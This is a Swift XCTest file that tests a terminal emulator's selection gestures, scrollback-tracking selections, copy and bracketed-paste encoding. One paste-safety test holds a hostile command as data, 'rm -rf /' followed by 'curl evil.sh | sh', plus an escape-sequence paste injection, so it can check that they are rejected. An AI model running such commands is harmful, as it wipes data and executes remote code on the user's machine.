//  SelectionTests.swift
//  The gesture machine, against a real terminal.
//
//  These drive `TerminalEngine`'s selection API the way the surface view
//  does — surface pixels in, formatted text out — so what is under test is
//  the whole path: pointer position to viewport cell to grid reference to
//  gesture to installed selection to clipboard string.

import AppKit
import GhosttyVt
import XCTest

final class SelectionTests: XCTestCase {
    /// 80x20 cells at 10x20 pixels each, no padding: a surface point divides
    /// straight into a cell, which keeps the arithmetic out of the tests.
    private let size = RendererSize(
        screen: ScreenSize(width: 800, height: 400),
        cell: CellSize(width: 10, height: 20),
        padding: EdgePadding())

    private func engine(_ text: String = "") throws -> TerminalEngine {
        let engine = try TerminalEngine(cols: 80, rows: 20)
        if !text.isEmpty { write(engine, text) }
        return engine
    }

    private func write(_ engine: TerminalEngine, _ text: String) {
        var bytes = Array(text.utf8)
        bytes.withUnsafeBufferPointer { engine.write(UnsafeRawBufferPointer($0)) }
    }

    /// A point inside a cell, in surface pixels.
    ///
    /// `nudge` moves it within the cell. Drags need the right-hand side:
    /// libghostty includes a cell in a drag only once the pointer is past its
    /// midpoint — the rule that makes selecting "the first four characters"
    /// feel like selecting four characters — so a drag to the exact centre
    /// would land one cell short.
    private func point(column: Int, row: Int, nudge: Double = 5) -> CGPoint {
        CGPoint(x: Double(column) * 10 + nudge, y: Double(row) * 20 + 10)
    }

    private func press(
        _ engine: TerminalEngine, column: Int, row: Int, at time: TimeInterval = 0,
        rectangle: Bool = false
    ) {
        engine.beginSelection(
            at: point(column: column, row: row), size: size, timestamp: time,
            repeatInterval: 0.5, rectangle: rectangle)
    }

    private func drag(
        _ engine: TerminalEngine, column: Int, row: Int, rectangle: Bool = false
    ) {
        engine.extendSelection(
            to: point(column: column, row: row, nudge: 8), size: size, rectangle: rectangle)
    }

    // MARK: - Gestures

    /// A single click selects nothing and clears what was there. Clicking to
    /// place the cursor is not a thing a terminal does, but clicking to
    /// dismiss a selection is.
    func testSingleClickClearsRatherThanSelects() throws {
        let engine = try engine("hello world")
        engine.selectAll()
        XCTAssertTrue(engine.hasSelection)

        press(engine, column: 3, row: 0)
        XCTAssertFalse(engine.hasSelection)
    }

    func testDragSelectsACellRange() throws {
        let engine = try engine("hello world")
        press(engine, column: 0, row: 0)
        drag(engine, column: 4, row: 0)
        XCTAssertEqual(engine.selectionText(), "hello")

        drag(engine, column: 10, row: 0)
        XCTAssertEqual(engine.selectionText(), "hello world")
    }

    /// Two presses inside the repeat interval are a double-click, and the
    /// gesture turns that into a word. Nothing in our code knows what a word
    /// is, which is the point.
    func testDoubleClickSelectsAWord() throws {
        let engine = try engine("hello world")
        press(engine, column: 8, row: 0, at: 0)
        press(engine, column: 8, row: 0, at: 0.1)
        XCTAssertEqual(engine.selectionText(), "world")
    }

    func testTripleClickSelectsTheLine() throws {
        let engine = try engine("hello world")
        press(engine, column: 3, row: 0, at: 0)
        press(engine, column: 3, row: 0, at: 0.1)
        press(engine, column: 3, row: 0, at: 0.2)
        XCTAssertEqual(engine.selectionText(), "hello world")
    }

    /// Two presses further apart than the repeat interval are two single
    /// clicks, not a double-click.
    func testSlowClicksAreNotADoubleClick() throws {
        let engine = try engine("hello world")
        press(engine, column: 8, row: 0, at: 0)
        press(engine, column: 8, row: 0, at: 2)
        XCTAssertFalse(engine.hasSelection)
    }

    /// A double-click drag extends by whole words, not by cells. This is the
    /// behaviour that is tedious to hand-roll and free here.
    func testWordDragExtendsByWords() throws {
        let engine = try engine("alpha beta gamma")
        press(engine, column: 0, row: 0, at: 0)
        press(engine, column: 0, row: 0, at: 0.1)
        XCTAssertEqual(engine.selectionText(), "alpha")

        // Land inside "beta" — a cell-granular drag would stop mid-word.
        drag(engine, column: 7, row: 0)
        XCTAssertEqual(engine.selectionText(), "alpha beta")
    }

    /// Option-drag selects a rectangle: the same columns on every row, rather
    /// than everything between two points.
    func testRectangleSelection() throws {
        let engine = try engine("abcdef\r\nghijkl\r\nmnopqr")
        press(engine, column: 1, row: 0, rectangle: true)
        drag(engine, column: 3, row: 2, rectangle: true)
        XCTAssertEqual(engine.selectionText(), "bcd\nhij\nnop")

        press(engine, column: 1, row: 0, at: 10)
        drag(engine, column: 3, row: 2)
        XCTAssertEqual(engine.selectionText(), "bcdef\nghijkl\nmnop")
    }

    // MARK: - Lifetime
    //
    // The reason `docs/CLIENT.md` insists on tracked references. A plain
    // `GhosttyGridRef` is invalidated by the next mutating call on the
    // terminal, and for us that is every frame of output — so a selection
    // built out of them would be wrong within milliseconds of being made.

    func testSelectionSurvivesOutput() throws {
        let engine = try engine("hello world")
        press(engine, column: 0, row: 0)
        drag(engine, column: 4, row: 0)
        XCTAssertEqual(engine.selectionText(), "hello")

        write(engine, "\r\nsome more output\r\n")
        XCTAssertEqual(engine.selectionText(), "hello")
    }

    /// And survives the selected row scrolling out of the viewport entirely,
    /// which is when an untracked reference stops pointing at anything.
    func testSelectionSurvivesScrollingIntoHistory() throws {
        let engine = try engine("hello world")
        press(engine, column: 0, row: 0)
        drag(engine, column: 4, row: 0)

        for i in 0..<60 { write(engine, "\r\nline \(i)") }
        XCTAssertEqual(engine.selectionText(), "hello")
    }

    /// A drag held while output arrives keeps extending from the same anchor.
    /// The anchor lives in the gesture rather than in the terminal, so this
    /// is a different reference from the one the previous two tests cover.
    func testAnchorSurvivesOutputMidDrag() throws {
        let engine = try engine("abcdefghij")
        press(engine, column: 0, row: 0)
        drag(engine, column: 2, row: 0)
        XCTAssertEqual(engine.selectionText(), "abc")

        // Output elsewhere on the screen: mutates the terminal without moving
        // the anchor's row, so the extension is exactly predictable.
        write(engine, "\u{1b}[10;1Hsome output")
        drag(engine, column: 5, row: 0)
        XCTAssertEqual(engine.selectionText(), "abcdef")
    }

    /// And when the output *does* scroll the anchor out of the viewport, the
    /// drag still extends from where the text went rather than from nothing.
    func testAnchorFollowsTextIntoHistory() throws {
        let engine = try engine("abcdefghij")
        press(engine, column: 0, row: 0)
        drag(engine, column: 2, row: 0)

        // Fill the screen and then some, so row 0 is well into history.
        for i in 0..<40 { write(engine, "\r\nline \(i)") }

        drag(engine, column: 3, row: 19)
        let text = try XCTUnwrap(engine.selectionText())
        // The anchor is still on the original row, now deep in history, and
        // the drag end is four characters into the last visible line.
        XCTAssertTrue(text.hasPrefix("abcdefghij\nline 0\n"), "anchor lost: \(text)")
        XCTAssertTrue(text.hasSuffix("\nline 38\nline"), "drag end wrong: \(text)")
    }

    // MARK: - Whole selections

    func testSelectAllAndClear() throws {
        let engine = try engine("alpha\r\nbeta")
        engine.selectAll()
        XCTAssertEqual(engine.selectionText(), "alpha\nbeta")

        engine.clearSelection()
        XCTAssertFalse(engine.hasSelection)
        XCTAssertNil(engine.selectionText())
    }

    /// Copy joins soft-wrapped lines and drops trailing whitespace, which is
    /// what makes a copied command paste back as one command.
    func testCopyUnwrapsSoftWrappedLines() throws {
        let engine = try TerminalEngine(cols: 10, rows: 5)
        write(engine, "abcdefghijklmno")
        engine.selectAll()
        XCTAssertEqual(engine.selectionText(), "abcdefghijklmno")
    }

    // MARK: - Paste

    func testPasteIsSafeRejectsCommandInjection() {
        XCTAssertTrue(TerminalEngine.pasteIsSafe("ls -la"))
        XCTAssertFalse(TerminalEngine.pasteIsSafe("rm -rf /\ncurl evil.sh | sh"))
        XCTAssertFalse(TerminalEngine.pasteIsSafe("x\u{1b}[201~y"))
    }

    func testPasteEncodingFollowsBracketedMode() throws {
        let engine = try engine()

        let plain = try XCTUnwrap(engine.encodePaste("hello"))
        XCTAssertEqual(String(decoding: plain, as: UTF8.self), "hello")

        write(engine, "\u{1b}[?2004h")
        let bracketed = try XCTUnwrap(engine.encodePaste("hello"))
        XCTAssertEqual(
            String(decoding: bracketed, as: UTF8.self), "\u{1b}[200~hello\u{1b}[201~")
    }

    /// Outside bracketed paste a newline is a pressed return, so it becomes a
    /// carriage return rather than being smuggled through as a line feed.
    func testUnbracketedPasteNormalisesNewlines() throws {
        let engine = try engine()
        let encoded = try XCTUnwrap(engine.encodePaste("one\ntwo"))
        XCTAssertEqual(String(decoding: encoded, as: UTF8.self), "one\rtwo")
    }

    func testEmptyPasteEncodesToNothing() throws {
        let engine = try engine()
        XCTAssertNil(engine.encodePaste(""))
    }

    // MARK: - Repainting

    /// A selection changes no cell, so libghostty's per-row dirty flags do
    /// not describe it. Without forcing a rebuild the frame would keep the
    /// old highlight — or never draw one.
    func testSelectionForcesAFullRepaint() throws {
        let engine = try engine("hello world")
        let snapshot = TerminalSnapshot()
        XCTAssertTrue(engine.updateSnapshot(into: snapshot))
        XCTAssertTrue(engine.updateSnapshot(into: snapshot))
        XCTAssertEqual(snapshot.dirty, .clean)

        engine.selectAll()
        XCTAssertTrue(engine.updateSnapshot(into: snapshot))
        XCTAssertEqual(snapshot.dirty, .full)
        XCTAssertNotNil(snapshot.rowData[0].selection)
    }
}
